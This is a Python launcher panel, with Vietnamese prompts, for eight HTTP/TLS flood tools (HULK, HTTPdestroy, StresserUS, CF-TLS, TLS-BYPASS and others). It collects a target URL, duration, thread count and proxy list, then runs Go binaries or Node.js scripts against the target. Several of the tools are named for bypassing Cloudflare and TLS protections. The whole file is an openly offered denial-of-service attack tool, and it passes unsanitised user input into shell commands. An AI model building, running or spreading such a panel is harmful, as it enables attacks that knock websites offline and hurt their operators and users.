# Chương trình được thu thập, biên dịch và phát triển từ Đậu Đậu
import subprocess
import os
from os import name, system

if name == 'nt':
    system("title Đậu Đậu - HTTP2 Tunner")
    system("mode 101, 30")

# Hàm để chạy các lệnh shell khởi động script nodejs
def run_script(script_name, args):
    command = ['node', script_name] + args
    subprocess.run(command)

# Đếm số proxy trong tệp
def count_proxy(proxy_file):
    with open(proxy_file, 'r') as file:
        proxies = file.readlines()
    # Loại bỏ dòng trắng và các dòng chỉ chứa khoảng trắng
    proxies = [proxy.strip() for proxy in proxies if proxy.strip()]
    return len(proxies)

# Hiển thị menu chọn script
def show_menu():
    os.system("cls" if os.name == "nt" else "clear")
    print()
    print("  ________  __         ______             __ ")
    print(" /        |/  |       /      \           /  |     https://github.com/DauDau432/HTTP2-Tunner")
    print(" $$$$$$$$/ $$ |      /$$$$$$  |         _$$ |_    __    __  _______   _______    ______    ______")
    print("    $$ |   $$ |      $$ \__$$/  ______ / $$   |  /  |  /  |/       \ /       \  /      \  /      \ ")
    print("    $$ |   $$ |      $$      \ /      |$$$$$$/   $$ |  $$ |$$$$$$$  |$$$$$$$  |/$$$$$$  |/$$$$$$  |")
    print("    $$ |   $$ |       $$$$$$  |$$$$$$/   $$ | __ $$ |  $$ |$$ |  $$ |$$ |  $$ |$$    $$ |$$ |  $$/")
    print("    $$ |   $$ |_____ /  \__$$ |          $$ |/  |$$ \__$$ |$$ |  $$ |$$ |  $$ |$$$$$$$$/ $$ |      ")
    print("    $$ |   $$       |$$    $$/           $$  $$/ $$    $$/ $$ |  $$ |$$ |  $$ |$$       |$$ |      ")
    print("    $$/    $$$$$$$$/  $$$$$$/             $$$$/   $$$$$$/  $$/   $$/ $$/   $$/  $$$$$$$/ $$/       ")
    print()
    print("============= Method layer 7 ============")
    print("  ==> Golang")
    print("  [1] - HULK")
    print("  [2] - HTTPdestroy")
    print("  [3] - StresserUS")
    print("  ==> Nodejs")
    print("  [4] - HTTP2")
    print("  [5] - CF-TLS")
    print("  [6] - CFS")
    print("  [7] - TLS-BYPASS")
    print("  [8] - TLS-kill")
    print("  [0] - Thoát")
    print("=========================================")

# Xử lý lựa chọn script từ người dùng
def handle_menu_selection(selection):
    if selection == '1':
        print("\n================= HULK ==================")
        target = input("  Nhập target: ")

        os.system("cls" if os.name == "nt" else "clear")
        print()
        print("================= HULK ==================")
        print(f"  Thông tin mục tiêu tấn công")
        print(f"  Target: {target}")
        print("=========================================")
        input("  xác nhận attack (Enter)\n")
        os.system(f"go run hulk.go -site target={target}")

    elif selection == '2':
        print("\n============== HTTPdestroy ==============")
        target = input("  Nhập target: ")
        time = input("  Nhập time: ")
        requests = input("  Nhập requests per IP: ")
        thread = input("  Nhập thread: ")
        proxy_file = input("  Nhập file proxy: ")
        os.system("cls" if os.name == "nt" else "clear")
        print()
        print("============== HTTPdestroy ==============")
        print(f"  Thông tin mục tiêu tấn công")
        print(f"  Target: {target}")
        print(f"  Time: {time}")
        print(f"  Requests per IP: {requests}")
        print(f"  Thread: {thread}")
        print(f"  Proxyfile: {proxy_file}")
        print("=========================================")
        input("  xác nhận attack (Enter)\n")
        os.system(f"chmod 777 httpdestroy")
        proxy_count = count_proxy(proxy_file)
        print(f"  Số proxy được tìm thấy: {proxy_count}")
        os.system(f"./httpdestroy target={target} time={time} requests={requests} thread={thread} proxy_file={proxy_file}")

    elif selection == '3':
        print("\n=============== StresserUS ==============")
        target = input("  Nhập target: ")
        limit = input("  Nhập Rate limit: ")
        time = input("  Nhập time: ")
        proxy_file = input("  Nhập file proxy: ")
        thread = input("  Nhập thread: ")
        mode = input("  Nhập mode: ")
        os.system("cls" if os.name == "nt" else "clear")
        print()
        print("=============== StresserUS ==============")
        print(f"  Thông tin mục tiêu tấn công")
        print(f"  Target: {target}")
        print(f"  Rate limit: {limit}")
        print(f"  Time: {time}")
        print(f"  Proxyfile: {proxy_file}")
        print(f"  Thread: {thread}")
        print(f"  Mode: {mode}")
        print("=========================================")
        input("  xác nhận attack (Enter)\n")
        os.system(f"chmod +x StresserUS")
        proxy_count = count_proxy(proxy_file)
        print(f"  Số proxy được tìm thấy: {proxy_count}")
        os.system(f"./StresserUS version=2 target={target} limit={limit} time={time} proxy_file={proxy_file} threads={thread} mode={mode}")
#./StresserUS version=2 host=<url> limit=<rate> time=<time> list=<proxyfile> threads=<thread> mode=<GET/POST> cookie=<ddos=true> data=<post=true>

    elif selection == '4':
        print("\n================= HTTP2 =================")
        target = input("  Nhập target: ")
        time = input("  Nhập time: ")
        os.system("cls" if os.name == "nt" else "clear")
        print()
        print("================= HTTP2 =================")
        print(f"  Thông tin mục tiêu tấn công")
        print(f"  Target: {target}")
        print(f"  Time: {time}")
        print()
        print(f"  Thông tin mặc định")
        print(f"  Proxyfile: proxy.txt")
        print(f"  Uafile: ua.txt")
        print("=========================================")
        input("  xác nhận attack (Enter)\n")
        proxy_file = "proxy.txt"
        proxy_count = count_proxy(proxy_file)
        print(f"  Số proxy được tìm thấy: {proxy_count}")
        run_script('HTTP2.js', [target, time])

    elif selection == '5':
        print("\n================= CF-TLS ================")
        target = input("  Nhập target: ")
        time = input("  Nhập time: ")
        thread = input("  Nhập thread: ")
        proxy_file = input("  Nhập file proxy: ")
        os.system("cls" if os.name == "nt" else "clear")
        print()
        print("================= CF-TLS ================")
        print(f"  Thông tin mục tiêu tấn công")
        print(f"  Target: {target}")
        print(f"  Time: {time}")
        print(f"  Thread: {thread}")
        print(f"  Proxyfile: {proxy_file}")
        print("=========================================")
        input("  xác nhận attack (Enter)\n")
        proxy_count = count_proxy(proxy_file)
        print(f"  Số proxy được tìm thấy: {proxy_count}")     
        run_script('CF-TLS.js', [target, time, thread, proxy_file])

    elif selection == '6':
        print("\n================== CFS ==================")
        target = input("  Nhập target: ")
        time = input("  Nhập time: ")
        thread = input("  Nhập thread: ")
        mode = input("  Nhập mode: ")
        proxy_file = input("  Nhập file proxy: ")
        requests = input("  Nhập requests per IP: ")
        os.system("cls" if os.name == "nt" else "clear")
        print()
        print("================== CFS ==================")
        print(f"  Thông tin mục tiêu tấn công")
        print(f"  Target: {target}")
        print(f"  Time: {time}")
        print(f"  Thread: {thread}")
        print(f"  Mode: {mode}")
        print(f"  Proxyfile: {proxy_file}")
        print(f"  Requests per IP: {requests}")
        print("=========================================")
        input("  xác nhận attack (Enter)\n")
        proxy_count = count_proxy(proxy_file)
        print(f"  Số proxy được tìm thấy: {proxy_count}")
        print(f"\n  Đang attack")
        print(f"  Chương trình được chỉnh sửa & biên dịch bởi Đậu Đậu\n")
        run_script('CFS.js', [target, time, thread, mode, proxy_file, requests])

    elif selection == '7':
        print("\n=============== TLS-BYPASS ==============")
        target = input("  Nhập target: ")
        time = input("  Nhập time: ")
        thread = input("  Nhập thread: ")
        proxy_file = input("  Nhập file proxy: ")
        requests = input("  Nhập requests per IP: ")
        os.system("cls" if os.name == "nt" else "clear")
        print()
        print("=============== TLS-BYPASS ==============")
        print(f"  Thông tin mục tiêu tấn công")
        print(f"  Target: {target}")
        print(f"  Time: {time}")
        print(f"  Thread: {thread}")
        print(f"  Proxyfile: {proxy_file}")
        print(f"  Requests per IP: {requests}")
        print("=========================================")
        input("  xác nhận attack (Enter)\n")
        proxy_count = count_proxy(proxy_file)
        print(f"  Số proxy được tìm thấy: {proxy_count}")
        print(f"\n  Đang attack")
        print(f"  Chương trình được chỉnh sửa & biên dịch bởi Đậu Đậu\n")
        run_script('TLS-BYPASS.js', [target, time, thread, proxy_file, requests])

    elif selection == '8':
        print("\n================ TLS-kill ===============")
        target = input("  Nhập target: ")
        thread = input("  Nhập thread: ")
        requests = input("  Nhập requests per IP: ")
        mode = input("  Nhập mode: ")
        time = input("  Nhập time: ")
        os.system("cls" if os.name == "nt" else "clear")
        print()
        print("================ TLS-kill ================")
        print(f"  Thông tin mục tiêu tấn công")
        print(f"  Target: {target}")
        print(f"  Thread: {thread}")
        print(f"  Requests per IP: {requests}")
        print(f"  Mode: {mode}")
        print(f"  Time: {time}")
        print()
        print(f"  Thông tin mặc định")
        print(f"  Proxyfile: http.txt")
        print(f"  Uafile: ua.txt")
        print("==========================================")
        input("  xác nhận attack (Enter)\n")
        proxy_file = "http.txt"
        proxy_count = count_proxy(proxy_file)
        print(f"  Số proxy được tìm thấy: {proxy_count}")
        print(f"\n  Đang attack")
        print(f"  Chương trình được chỉnh sửa & biên dịch bởi Đậu Đậu\n")
        run_script('TLS-kill.js', [target, thread, requests, mode, time])

    else:
        print("  Lựa chọn không hợp lệ.")

# Khởi động panel
def start_panel():
    while True:
        show_menu()
        selection = input("  Nhập lựa chọn của bạn (0-8): ")
        
        if selection == '0':
            break
        
        if selection not in ['1', '2', '3', '4', '5', '6', '7', '8']:
            print("  Lựa chọn không hợp lệ. Vui lòng chọn lại.")
            continue
        
        handle_menu_selection(selection)

# Bắt đầu chạy panel
start_panel()

# https://github.com/DauDau432/HTTP2-Tunner/